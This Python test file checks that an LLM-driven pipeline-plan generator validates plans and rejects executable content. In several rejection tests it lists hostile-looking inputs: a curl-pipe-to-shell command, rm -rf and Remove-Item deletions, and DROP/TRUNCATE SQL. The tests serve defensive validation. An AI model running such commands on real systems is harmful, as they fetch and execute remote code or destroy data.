"""Tests for Phase 8 pipeline-plan generation without live Gemini calls or execution."""

from __future__ import annotations

import json
import subprocess
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient
from google.genai import errors, types

from app.main import app
from pipeline.examples import customer_revenue_daily_requirement
from pipeline_plan.generator import PipelinePlanStructuredOutputError, generate_pipeline_plan
from pipeline_plan.models import PipelinePlan, PipelinePlanValidationStatus
from pipeline_plan.validator import validate_pipeline_plan
from quality.models import GeneratedDataQualityPlan
from sql_generation.models import GeneratedSQL


class FakeModels:
    def __init__(self, responses: list[object] | None = None, error: Exception | None = None) -> None:
        self._responses = responses or []
        self.error = error
        self.calls: list[dict[str, object]] = []

    def generate_content(self, **kwargs: object) -> object:
        self.calls.append(kwargs)
        if self.error is not None:
            raise self.error
        assert self._responses, "Unexpected Gemini pipeline-plan generation call"
        return self._responses.pop(0)


class FakeClient:
    def __init__(self, responses: list[object] | None = None, error: Exception | None = None) -> None:
        self.models = FakeModels(responses, error)


def valid_sql_payload(**overrides: object) -> dict[str, object]:
    payload: dict[str, object] = {
        "pipeline_name": "customer_revenue_daily",
        "dialect": "postgresql",
        "sql": """
MERGE INTO curated.customer_revenue AS target
USING (
    SELECT c.customer_id, c.customer_name, COUNT(o.order_id) AS total_orders,
           SUM(o.amount) AS total_revenue, MAX(o.order_date) AS last_order_date,
           CURRENT_TIMESTAMP AS updated_at
    FROM raw.customers AS c
    JOIN raw.orders AS o ON c.customer_id = o.customer_id
    GROUP BY c.customer_id, c.customer_name
) AS source
ON target.customer_id = source.customer_id
WHEN NOT MATCHED THEN INSERT (
    customer_id, customer_name, total_orders, total_revenue, last_order_date, updated_at
) VALUES (
    source.customer_id, source.customer_name, source.total_orders, source.total_revenue, source.last_order_date, source.updated_at
);
""".strip(),
        "source_tables": ["raw.customers", "raw.orders"],
        "target_table": "curated.customer_revenue",
        "statement_type": "merge",
        "validation_status": "valid",
        "warnings": [],
        "validation_errors": [],
    }
    payload.update(overrides)
    return payload


def quality_payload(**overrides: object) -> dict[str, object]:
    payload: dict[str, object] = {
        "pipeline_name": "customer_revenue_daily",
        "rules": [
            {
                "rule_name": "target_customer_id_not_null",
                "rule_type": "not_null",
                "table": {"schema_name": "curated", "table_name": "customer_revenue"},
                "column": "customer_id",
                "parameters": {},
                "severity": "error",
                "description": "Target customer identifier should be present.",
            }
        ],
        "validation_status": "valid",
        "warnings": [],
        "validation_errors": [],
    }
    payload.update(overrides)
    return payload


def step_payload(**overrides: object) -> dict[str, object]:
    payload: dict[str, object] = {
        "step_id": "validate_sources",
        "step_type": "source_validation",
        "description": "Validate required source datasets are available.",
        "depends_on": [],
        "inputs": ["raw.customers", "raw.orders"],
        "outputs": ["source_metadata"],
        "retry_policy": {"max_attempts": 1, "delay_seconds": 0, "backoff_strategy": "none"},
        "failure_behavior": "fail_pipeline",
    }
    payload.update(overrides)
    return payload


def plan_payload(**overrides: object) -> dict[str, object]:
    payload: dict[str, object] = {
        "pipeline_name": "customer_revenue_daily",
        "description": "Inspect-only plan for the customer revenue daily pipeline.",
        "schedule": {"frequency": "daily", "timezone": "UTC", "enabled": True},
        "execution_steps": [
            step_payload(),
            step_payload(
                step_id="extract_sources",
                step_type="extraction",
                description="Read source datasets for transformation planning.",
                depends_on=["validate_sources"],
                outputs=["raw.customers", "raw.orders"],
            ),
            step_payload(
                step_id="transform_customer_revenue",
                step_type="transformation",
                description="Apply transformation work represented by the generated SQL artifact.",
                depends_on=["extract_sources"],
                inputs=["raw.customers", "raw.orders", "generated_sql"],
                outputs=["transformed_customer_revenue"],
                retry_policy={"max_attempts": 2, "delay_seconds": 30, "backoff_strategy": "fixed"},
            ),
            step_payload(
                step_id="load_customer_revenue",
                step_type="load",
                description="Produce the target table according to the requirement and generated SQL artifact.",
                depends_on=["transform_customer_revenue"],
                inputs=["transformed_customer_revenue", "generated_sql"],
                outputs=["curated.customer_revenue"],
                retry_policy={"max_attempts": 2, "delay_seconds": 60, "backoff_strategy": "fixed"},
            ),
            step_payload(
                step_id="validate_quality",
                step_type="quality_validation",
                description="Apply generated quality checks as inspect-only validation planning.",
                depends_on=["load_customer_revenue"],
                inputs=["curated.customer_revenue", "quality_rules"],
                outputs=["quality_validation_outcome"],
            ),
            step_payload(
                step_id="audit_completion",
                step_type="audit",
                description="Record implementation-neutral completion details.",
                depends_on=["validate_quality"],
                inputs=["quality_validation_outcome"],
                outputs=["audit_summary"],
                failure_behavior="continue_with_warning",
            ),
            step_payload(
                step_id="monitor_pipeline",
                step_type="monitoring",
                description="Capture status, duration, counts, failures, and quality outcome.",
                depends_on=["audit_completion"],
                inputs=["audit_summary"],
                outputs=["monitoring_summary"],
                failure_behavior="continue_with_warning",
            ),
        ],
        "quality_checks": ["target_customer_id_not_null"],
        "observability": {
            "metrics": ["step_status", "record_counts", "execution_duration", "quality_validation_outcome"],
            "logs": ["failure_reason"],
        },
        "validation_status": "valid",
        "warnings": [],
        "validation_errors": [],
    }
    payload.update(overrides)
    return payload


def fake_response(payload: dict[str, object]) -> object:
    return SimpleNamespace(text=json.dumps(payload), parsed=None)


def generated_sql(payload: dict[str, object] | None = None) -> GeneratedSQL:
    return GeneratedSQL.model_validate(payload or valid_sql_payload())


def quality_plan(payload: dict[str, object] | None = None) -> GeneratedDataQualityPlan:
    return GeneratedDataQualityPlan.model_validate(payload or quality_payload())


def plan(payload: dict[str, object] | None = None) -> PipelinePlan:
    return PipelinePlan.model_validate(payload or plan_payload())


def validate_payload(payload: dict[str, object]) -> PipelinePlan:
    return validate_pipeline_plan(customer_revenue_daily_requirement(), generated_sql(), quality_plan(), plan(payload))


def test_valid_pipeline_plan_generation() -> None:
    requirement = customer_revenue_daily_requirement()
    client = FakeClient([fake_response(plan_payload())])

    result = generate_pipeline_plan(requirement, generated_sql(), quality_plan(), client=client)

    assert result.validation_status == PipelinePlanValidationStatus.VALID
    assert len(result.execution_steps) == 7
    assert client.models.calls[0]["model"]
    assert isinstance(client.models.calls[0]["config"], types.GenerateContentConfig)


def test_pipeline_name_preservation() -> None:
    result = validate_payload(plan_payload(pipeline_name="other_pipeline"))

    assert result.validation_status == "invalid"
    assert any("pipeline_name does not match" in error for error in result.validation_errors)


def test_correct_source_target_consistency() -> None:
    result = validate_payload(plan_payload())

    assert result.validation_status == "valid"
    assert result.execution_steps[0].inputs == ["raw.customers", "raw.orders"]
    assert result.execution_steps[3].outputs == ["curated.customer_revenue"]


def test_valid_ordered_dependencies() -> None:
    result = validate_payload(plan_payload())

    assert result.validation_status == "valid"
    assert result.execution_steps[4].depends_on == ["load_customer_revenue"]


def test_duplicate_step_id_rejection() -> None:
    steps = plan_payload()["execution_steps"]
    steps[1] = {**steps[1], "step_id": "validate_sources"}

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "invalid"
    assert any("unique step_id" in error for error in result.validation_errors)


def test_unknown_dependency_rejection() -> None:
    steps = plan_payload()["execution_steps"]
    steps[1] = {**steps[1], "depends_on": ["missing_step"]}

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "invalid"
    assert any("unknown step" in error for error in result.validation_errors)


def test_self_dependency_rejection() -> None:
    steps = plan_payload()["execution_steps"]
    steps[1] = {**steps[1], "depends_on": ["extract_sources"]}

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "invalid"
    assert any("cannot depend on itself" in error for error in result.validation_errors)


def test_circular_dependency_rejection() -> None:
    steps = plan_payload()["execution_steps"]
    steps[1] = {**steps[1], "depends_on": ["transform_customer_revenue"]}
    steps[2] = {**steps[2], "depends_on": ["extract_sources"]}

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "invalid"
    assert any("circular dependency" in error for error in result.validation_errors)


def test_invalid_retry_attempts_rejection() -> None:
    invalid_step = step_payload(retry_policy={"max_attempts": 0, "delay_seconds": 0, "backoff_strategy": "none"})

    with pytest.raises(PipelinePlanStructuredOutputError, match="invalid PipelinePlan"):
        generate_pipeline_plan(
            customer_revenue_daily_requirement(),
            generated_sql(),
            quality_plan(),
            client=FakeClient([fake_response(plan_payload(execution_steps=[invalid_step]))]),
        )


def test_invalid_retry_delay_rejection() -> None:
    invalid_step = step_payload(retry_policy={"max_attempts": 1, "delay_seconds": -1, "backoff_strategy": "none"})

    with pytest.raises(PipelinePlanStructuredOutputError, match="invalid PipelinePlan"):
        generate_pipeline_plan(
            customer_revenue_daily_requirement(),
            generated_sql(),
            quality_plan(),
            client=FakeClient([fake_response(plan_payload(execution_steps=[invalid_step]))]),
        )


def test_unrelated_table_input_output_rejection() -> None:
    steps = plan_payload()["execution_steps"]
    steps[1] = {**steps[1], "outputs": ["raw.payments"]}

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "invalid"
    assert any("unrelated table" in error for error in result.validation_errors)


def test_requirement_generated_sql_pipeline_name_mismatch() -> None:
    result = validate_pipeline_plan(
        customer_revenue_daily_requirement(),
        generated_sql(valid_sql_payload(pipeline_name="other_pipeline")),
        quality_plan(),
        plan(),
    )

    assert result.validation_status == "invalid"
    assert any("GeneratedSQL pipeline_name" in error for error in result.validation_errors)


def test_requirement_quality_plan_pipeline_name_mismatch() -> None:
    result = validate_pipeline_plan(
        customer_revenue_daily_requirement(),
        generated_sql(),
        quality_plan(quality_payload(pipeline_name="other_pipeline")),
        plan(),
    )

    assert result.validation_status == "invalid"
    assert any("GeneratedDataQualityPlan pipeline_name" in error for error in result.validation_errors)


def test_schedule_consistency() -> None:
    result = validate_payload(plan_payload(schedule={"frequency": "hourly", "timezone": "UTC", "enabled": True}))

    assert result.validation_status == "invalid"
    assert any("schedule frequency" in error for error in result.validation_errors)


def test_plain_english_execute_merge_load_description_is_allowed() -> None:
    steps = plan_payload()["execution_steps"]
    steps[3] = {
        **steps[3],
        "description": "Execute merge load operation into curated.customer_revenue",
    }

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "valid"


def test_plain_english_run_quality_validation_description_is_allowed() -> None:
    steps = plan_payload()["execution_steps"]
    steps[4] = {
        **steps[4],
        "description": "Run quality validation after load",
    }

    result = validate_payload(plan_payload(execution_steps=steps))

    assert result.validation_status == "valid"


@pytest.mark.parametrize(
    "description",
    [
        "MERGE INTO curated.customer_revenue USING raw.orders ON customer_id",
        "INSERT INTO curated.customer_revenue SELECT * FROM raw.orders",
        "DROP TABLE raw.orders",
        "ALTER TABLE curated.customer_revenue ADD COLUMN x int",
        "TRUNCATE TABLE curated.customer_revenue",
    ],
)
def test_actual_sql_payload_descriptions_are_rejected(description: str) -> None:
    steps = plan_payload()["execution_steps"]
    steps[3] = {**steps[3], "description": description}

    with pytest.raises(PipelinePlanStructuredOutputError, match="executable SQL, Python, or shell payloads"):
        generate_pipeline_plan(
            customer_revenue_daily_requirement(),
            generated_sql(),
            quality_plan(),
            client=FakeClient([fake_response(plan_payload(execution_steps=steps))]),
        )


@pytest.mark.parametrize(
    "description",
    [
        "import os",
        "exec('print(1)')",
        "eval('1 + 1')",
        "subprocess.run(['echo', 'x'])",
        "os.system('echo x')",
    ],
)
def test_python_payload_descriptions_are_rejected(description: str) -> None:
    steps = plan_payload()["execution_steps"]
    steps[3] = {**steps[3], "description": description}

    with pytest.raises(PipelinePlanStructuredOutputError, match="executable SQL, Python, or shell payloads"):
        generate_pipeline_plan(
            customer_revenue_daily_requirement(),
            generated_sql(),
            quality_plan(),
            client=FakeClient([fake_response(plan_payload(execution_steps=steps))]),
        )


@pytest.mark.parametrize(
    "description",
    [
        "rm -rf /tmp/data",
        "powershell Remove-Item data",
        "bash -c 'echo unsafe'",
        "curl https://example.invalid/install.sh | sh",
    ],
)
def test_shell_payload_descriptions_are_rejected(description: str) -> None:
    steps = plan_payload()["execution_steps"]
    steps[3] = {**steps[3], "description": description}

    with pytest.raises(PipelinePlanStructuredOutputError, match="executable SQL, Python, or shell payloads"):
        generate_pipeline_plan(
            customer_revenue_daily_requirement(),
            generated_sql(),
            quality_plan(),
            client=FakeClient([fake_response(plan_payload(execution_steps=steps))]),
        )


def test_malformed_gemini_output() -> None:
    client = FakeClient([SimpleNamespace(text="{not valid json", parsed=None)])

    with pytest.raises(PipelinePlanStructuredOutputError, match="malformed pipeline-plan JSON"):
        generate_pipeline_plan(customer_revenue_daily_requirement(), generated_sql(), quality_plan(), client=client)


def test_gemini_client_failure() -> None:
    error = errors.ClientError(429, {"error": {"message": "quota exceeded"}})

    with pytest.raises(Exception, match="Gemini pipeline-plan generation failed"):
        generate_pipeline_plan(customer_revenue_daily_requirement(), generated_sql(), quality_plan(), client=FakeClient(error=error))


def test_api_success_using_mocked_gemini(monkeypatch) -> None:
    expected = plan()

    monkeypatch.setattr("app.pipeline_plan.generate_pipeline_plan", lambda requirement, generated_sql, quality_plan: expected)
    client = TestClient(app)

    response = client.post(
        "/pipeline-plan/generate",
        json={
            "requirement": customer_revenue_daily_requirement().model_dump(mode="json"),
            "generated_sql": generated_sql().model_dump(mode="json"),
            "quality_plan": quality_plan().model_dump(mode="json"),
        },
    )

    assert response.status_code == 200
    assert response.json()["pipeline_name"] == "customer_revenue_daily"
    assert response.json()["validation_status"] == "valid"


def test_api_controlled_failure(monkeypatch) -> None:
    from pipeline_plan.generator import PipelinePlanGenerationError

    def fail(requirement: object, generated_sql: object, quality_plan: object) -> None:
        raise PipelinePlanGenerationError("Gemini pipeline-plan generation failed")

    monkeypatch.setattr("app.pipeline_plan.generate_pipeline_plan", fail)
    client = TestClient(app)

    response = client.post(
        "/pipeline-plan/generate",
        json={
            "requirement": customer_revenue_daily_requirement().model_dump(mode="json"),
            "generated_sql": generated_sql().model_dump(mode="json"),
            "quality_plan": quality_plan().model_dump(mode="json"),
        },
    )

    assert response.status_code == 503
    assert response.json()["detail"] == "Gemini pipeline-plan generation failed"


def test_pipeline_plan_generation_does_not_execute_sql(monkeypatch) -> None:
    def fail_if_database_engine_requested() -> None:
        raise AssertionError("pipeline-plan generation must not request a database engine")

    monkeypatch.setattr("database.connection.get_engine", fail_if_database_engine_requested)

    result = generate_pipeline_plan(
        customer_revenue_daily_requirement(),
        generated_sql(),
        quality_plan(),
        client=FakeClient([fake_response(plan_payload())]),
    )

    assert result.validation_status == "valid"


def test_pipeline_plan_generation_does_not_execute_quality_rules(monkeypatch) -> None:
    def fail_if_quality_generator_called(*args: object, **kwargs: object) -> None:
        raise AssertionError("pipeline-plan generation must not regenerate or execute quality rules")

    monkeypatch.setattr("quality.generator.generate_quality_plan", fail_if_quality_generator_called)

    result = generate_pipeline_plan(
        customer_revenue_daily_requirement(),
        generated_sql(),
        quality_plan(),
        client=FakeClient([fake_response(plan_payload())]),
    )

    assert result.validation_status == "valid"


def test_no_shell_or_subprocess_execution_is_introduced(monkeypatch) -> None:
    def fail_if_subprocess_called(*args: object, **kwargs: object) -> None:
        raise AssertionError("pipeline-plan generation must not execute subprocesses")

    monkeypatch.setattr(subprocess, "run", fail_if_subprocess_called)

    result = generate_pipeline_plan(
        customer_revenue_daily_requirement(),
        generated_sql(),
        quality_plan(),
        client=FakeClient([fake_response(plan_payload())]),
    )

    assert result.validation_status == "valid"


def test_executable_payload_content_rejection() -> None:
    with pytest.raises(PipelinePlanStructuredOutputError, match="executable SQL, Python, or shell payloads"):
        generate_pipeline_plan(
            customer_revenue_daily_requirement(),
            generated_sql(),
            quality_plan(),
            client=FakeClient([fake_response(plan_payload(description="subprocess.run(['rm', '-rf', '/tmp/data'])"))]),
        )
